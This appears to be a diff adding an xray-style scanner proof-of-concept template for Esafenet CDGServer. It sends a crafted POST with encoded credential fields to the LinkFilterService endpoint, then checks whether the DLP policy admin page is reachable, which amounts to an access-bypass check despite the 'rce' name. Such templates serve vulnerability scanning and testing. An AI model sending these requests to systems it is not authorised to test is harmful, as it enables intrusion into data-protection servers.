@@ -1,0 +1,25 @@
+name: poc-yaml-esafenet-cdgserver-rce
+manual: true
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3//LinkFilterService
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+        expression: response.headers["location"].contains("frame.jsp")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /CDGServer3/sip-jsp/dlp-policy/dlpPolicyManage.jsp
+        expression: response.body_string.contains("dlpPolicyGrid")
+expression: r1() && r2()
+detail:
+    author: Chaitin
+    links:
+        - https://stack.chaitin.com/vuldb/detail/49323d29-68eb-4fe9-ba5a-b8eb13345de0
